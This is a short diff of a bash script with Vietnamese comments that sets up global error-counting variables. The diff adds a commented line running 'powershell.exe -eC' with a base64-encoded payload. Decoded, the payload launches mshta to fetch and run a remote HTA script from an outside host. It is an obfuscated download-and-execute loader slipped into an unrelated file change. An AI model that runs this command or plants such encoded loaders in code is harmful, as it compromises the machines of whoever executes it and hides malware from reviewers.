@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGEAcAB6AHoAegAtADIAMABjADcAZQAuAGsAeABjAGQAbgAuAGMAbwBtAC8AYQBwAHoAegB6AC0AMgAwAGMANwBlAA==
+
 # Khởi tạo biến toàn cục
 errorCount=0
 errorMessages=()
